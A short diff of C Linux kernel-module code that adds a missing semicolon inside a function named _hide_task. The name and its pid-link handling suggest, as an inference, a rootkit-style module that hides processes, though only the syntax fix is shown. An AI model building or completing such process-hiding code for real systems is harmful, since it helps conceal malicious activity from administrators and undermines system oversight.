@@ -30,7 +30,7 @@ static inline int _hide_task(void *data) {
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,11,0)
     struct hlist_node *link;
 #else
-    struct pid_link *link
+    struct pid_link *link;
 #endif
 
     if(!data)
